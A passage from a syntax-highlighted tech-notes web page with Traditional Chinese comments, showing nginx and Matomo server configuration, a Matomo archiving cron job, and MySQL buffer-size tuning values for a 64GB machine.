style=\"color:#f92672\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Logging Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/access.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/error.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Gzip Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003egzip\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_min_length\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_comp_level\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_proxied\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003eany\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003egzip_types\u003c/span\u003e       \u003cspan style=\"color:#e6db74\"\u003etext/plain\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etext/css\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/javascript\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eimage/svg+xml\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 全域 expires 規則\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eexpires\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e1d\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eCache-Control\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;public\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_vary on;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_proxied any;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_comp_level 6;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_buffers 16 8k;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_http_version 1.1;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Virtual Host Configs\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/conf.d/*.conf\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/sites-enabled/*\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"matomoconf\"\u003ematomo.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eanalytics.matomo.cc\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/www/html/matomo\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eindex\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.php\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eindex.html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/matomo.access.log\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e/var/log/nginx/matomo.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003etry_files\u003c/span\u003e $uri $uri/ =\u003cspan style=\"color:#ae81ff\"\u003e404\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Matomo Rewrite for pretty URLs\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e^/(index|piwik|matomo)\\.php(/|$)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_split_path_info\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e^(.+\\.php)(/.*)\u003c/span\u003e$;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_pass\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eunix:/run/php/php8.1-fpm.sock\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efastcgi_params\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ePATH_INFO\u003c/span\u003e $fastcgi_path_info;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eSCRIPT_FILENAME\u003c/span\u003e $document_root$fastcgi_script_name;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_param\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHTTPS\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 緩衝區\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_buffers\u003c/span\u003e           \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e16k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_buffer_size\u003c/span\u003e       \u003cspan style=\"color:#ae81ff\"\u003e32k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_busy_buffers_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_temp_file_write_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e64k\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 逾時\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_read_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_connect_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_send_timeout\u003c/span\u003e    \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# 加速 HEAD 請求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003efastcgi_ignore_headers\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003eX-Accel-Buffering\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 靜態檔案快取\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~\u003cspan style=\"color:#e6db74\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\\.(js|woff2?|ttf|css|png|jpg|jpeg|gif|ico|svg)\u003c/span\u003e$ {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eexpires\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003elog_not_found\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 安全：拒絕存取 .ht*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e ~ \u003cspan style=\"color:#e6db74\"\u003e/\\.ht\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eall\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"crontab\"\u003ecrontab\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*/5 * * * * php /var/www/html/matomo/console core:archive --force-all-websites \u0026gt; /var/log/matomo-archive.log 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMySQL\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 臨時表大小 - 可以設定更大\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etmp_table_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648      # 2GB (約記憶體的3-4%)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax_heap_table_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648 # 2GB (必須與 tmp_table_size 相同)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 排序緩衝區 - 每個連線獨立使用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esort_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e4194304       # 4MB (不要太大，會佔用過多記憶體)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 讀取緩衝區\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2097152       # 2MB (你的設定已經合適)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eread_rnd_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e8388608   # 8MB (可以稍微增大)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 連線緩衝區\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ejoin_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e8388608       # 8MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ebulk_insert_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e67108864 # 64MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# InnoDB 相關\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_buffer_pool_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e42949672960  # 40GB (約記憶體的60-65%)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_file_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e2147483648      # 2GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003einnodb_log_buffer_size\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e67108864      # 64MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 設定原則\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# tmp_table_size \u0026amp; max_heap_table_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 這兩個參數必須相同\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議設定為記憶體的 2-4%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 64GB 機器建議 1-2GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# sort_buffer_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 每個連線都會分配，不要設太大\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議 2-8MB，你的 2MB 其實已經合適\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# innodb_buffer_pool_size：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 最重要的參數\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 建議設定為記憶體的 60-70%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 64GB 機器建議 38-42GB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# TempTable Storage Engine 參數（MySQL 8.0 關鍵）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003etemptable_max_ram\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e4294967296      # 